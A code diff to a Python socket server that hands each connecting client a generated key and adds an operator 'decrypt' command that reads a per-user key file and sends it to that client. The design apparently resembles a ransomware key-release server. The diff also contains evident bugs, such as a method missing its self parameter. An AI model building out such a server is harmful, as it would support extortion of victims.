@@ -61,6 +61,7 @@ class Server():
                 return
         
         new_thread.conn.send(self.keyGen(userId))
+        self.threads[userId] = new_thread
     
     def start(self) -> None:
         r_socks, w_socks, e_socks = select.select([self.ss], [], [])
@@ -69,8 +70,9 @@ class Server():
                 (conn, (self.host, self.port)) = self.ss.accept()
                 new_thread = ClientThread(self.host, self.port, conn, self.thread_check)
                 new_thread.start()
-                
-                self.threads[new_thread.id] = new_thread
+            
+    def sig_dec(key: str, user: ClientThread) -> None:
+        user.conn.send(bytes(key, "Utf-8"))
 
     def inputThread(self) -> str:
         while 1:
@@ -78,6 +80,14 @@ class Server():
             print(self.inp)
             if self.inp == "kill":
                 return
+            
+            cmd = self.inp.split(' ')[0]
+            user = self.inp.split(' ')[1]
+            if cmd == "decrypt":
+                with open(user, 'r') as userfile:
+                    key = userfile.readline()
+                    print(key)
+                    self.sig_dec(key, self.threads[user])
 
     def inputLoop(self) -> None:
         
